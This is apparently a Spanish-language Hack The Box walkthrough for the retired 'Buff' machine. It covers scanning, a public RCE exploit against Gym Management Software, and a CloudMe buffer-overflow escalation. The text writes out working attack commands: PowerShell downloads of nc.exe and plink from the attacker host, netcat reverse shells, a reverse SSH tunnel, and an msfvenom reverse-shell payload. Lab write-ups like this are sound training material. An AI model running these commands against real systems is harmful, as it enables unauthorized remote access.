# BUFF-HTB

Desarrollo de la VM BUFF de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
┌──(root㉿kali)-[~/HT/BUFF]
└─# cat full.nmap 
# Nmap 7.92 scan initiated Tue Apr 19 19:05:35 2022 as: nmap -n -P0 --top-ports 5000 -sS -sC -vv -oA full 10.129.25.107
Nmap scan report for 10.129.25.107
Host is up, received user-set (0.26s latency).
Scanned at 2022-04-19 19:05:37 EDT for 104s
Not shown: 4999 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Apr 19 19:07:21 2022 -- 1 IP address (1 host up) scanned in 106.96 seconds
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff1.jpg" width=80% />


## 3. Enumeración

- Enumeración HTTP. en la página contact.php podemos identificar que es un CMS: GYM MANAGEMENT SOFTWARE 1.0

```
┌──(root㉿kali)-[~/HT/BUFF]
└─# gobuster dir -u http://10.129.25.107:8080/ -w /root/SecLists/Discovery/Web-Content/big.txt -t 80 -x .php,.html,.txt
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff2.jpg" width=80% />

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff3.jpg" width=80% />

- En EXPLOIT-DB detallan que el CMS tiene una vulnerabilidad del tipo RCE (Remote Code Execution)

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff4.jpg" width=80% />


## 4. Explotación

- Se ejecuta el exploit con Python2.7 (con otra versión no funciona)

```
┌──(root㉿kali)-[~/HT/BUFF]
└─# python2.7 exploit.py http://10.129.25.107:8080/
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff5.jpg" width=80% />

- La shell no es interactiva asi que utilizamos NETCAT para obtener una shell reversa.

```
C:\xampp\htdocs\gym\upload> powershell Invoke-WebRequest -Uri http://10.10.16.25/nc.exe -OutFile c:\Users\shaun\Downloads\nc.exe
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff6.jpg" width=80% />

```
C:\xampp\htdocs\gym\upload> c:\Users\shaun\Downloads\nc.exe  10.10.16.25 443 -e cmd.exe
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff7.jpg" width=80% />



## 5. Elevando Privilegios

### 5.1. TUNNELING SSH

- Hay una pista a seguir: un archivo CLOUDME_1112.EXEen la carpeta Downloads. 

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff8.jpg" width=80% />

- Hay algunos puertos no comunes y el puerto TCP/8888 es del proceso CLOUDME.

```
netstat -ano | findstr "LISTENING"
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff9.jpg" width=80% />


- CLOUDME tiene una vulnerabilidad de Buffer Overflow (BoF)
- No es posible acceder a el puerto TCP/8888, toca realizar un TUNNELING. Usamos PLINK para el tunel a través de SSH.

```
C:\xampp\htdocs\gym\upload>powershell Invoke-WebRequest -Uri http://10.10.16.25/plink.exe -OutFile c:\Users\shaun\Downloads\plink.exe
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff10.jpg" width=80% />

```
C:\xampp\htdocs\gym\upload>c:\Users\shaun\Downloads\plink.exe -ssh -P 8001 root@10.10.16.25 -pw password -R 8002:127.0.0.1:8888 -N
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff11.jpg" width=80% />


### 5.2. BoF (Buffer Overflow)

- Ahora que ya tenemos el puerto, veamos la el BoF

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff12.jpg" width=80% />

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff13.jpg" width=80% />


- Solo modificamos el PAYLOAD por una conexión REVERSA

```
┌──(root㉿kali)-[~/HT/BUFF]
└─# msfvenom -p windows/exec CMD='C:\users\shaun\Downloads\nc.exe 10.10.16.25 8003 -e cmd.exe' -b '\x00\x0A\x0D' -f python -v payload 
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff14.jpg" width=80% />

- Descargamos el EXPLOIT y modificamos el payload con la conexión reversa.

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff15.jpg" width=80% />

```
┌──(root㉿kali)-[~/HT/BUFF]
└─# python3 /home/kali/Downloads/48389.py
```

<img src="https://github.com/El-Palomo/BUFF-HTB/blob/main/Buff16.jpg" width=80% />

